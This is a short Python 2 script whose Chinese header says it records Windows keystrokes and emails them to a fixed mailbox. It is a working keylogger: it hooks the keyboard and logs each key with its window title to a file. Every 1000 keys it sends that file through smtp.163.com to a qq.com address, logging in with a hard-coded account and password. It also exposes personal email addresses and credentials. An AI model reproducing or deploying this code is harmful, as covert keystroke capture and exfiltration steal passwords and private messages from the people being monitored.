#encoding:utf-8
#!/usr/bin/python

###################################################################################
# 此脚本的作用是记录windows系统中用户所输入的键值，并已邮件的形式发送到指定邮箱   #
#                                        Coder：郝超鹏  Time:2015/8/11            #
###################################################################################

import pythoncom
import pyHook
from email.Header import Header
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.header import Header  
from email.mime.text import MIMEText  
from email.mime.multipart import MIMEMultipart  
import smtplib, datetime  

TIMES=0       
   
def onKeyboardEvent(event):
    global TIMES
    f=open('record.txt','a')
    f.write(str(event.MessageName)+"   ")
    f.write(str(event.WindowName)+"   ")
    f.write(str(event.Key))
    f.write('\n')
    TIMES+=1
    print TIMES
    if TIMES>1000:
        SendMail()
        TIMES=0
    return True
    #print "messages name:",event.MessageName
    #print "message:",event.Message
    #print "Window:",event.Window
    #print "WindowNanme:",event.WindowName
    #print "KeyID:", event.KeyID
    #print "ScanCode:", event.ScanCode
    #print "Extended:", event.Extended
    #print "Injected:", event.Injected
    #print "Alt", event.Alt
    #print "Transition", event.Transition
    #print "Ascii:",event.Ascii
    #print "Time:", event.Time
    #print "Key:", event.Key
    
def SendMail():
    msg = MIMEMultipart() 
    att = MIMEText(open('C:\\Users\\hao\\Desktop\\record.txt', 'rb').read(), 'base64', 'gb2312')  
    att["Content-Type"] = 'application/octet-stream'  
    att["Content-Disposition"] = 'attachment; filename="record.txt"'  
    msg.attach(att)
    msg['to'] = '819363254@qq.com'  
    msg['from'] = '18782207807@163.com'  
    msg['subject'] = Header('testABC (' + str(datetime.date.today()) + ')','gb2312')
    try:3
        server = smtplib.SMTP()
        server.connect('smtp.163.com')
        server.ehlo()
        server.starttls()
        server.login('18782207807@163.com','jymtyurtjxfqtrya')  
        error=server.sendmail(msg['from'], msg['to'], msg.as_string())  
    except Exception, e:
        print e    
    
def main():
    #print "haha3" #测试语句
    
    hao = pyHook.HookManager()
    hao.KeyDown = onKeyboardEvent
    hao.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    #print "haha2" #测试语句
    main()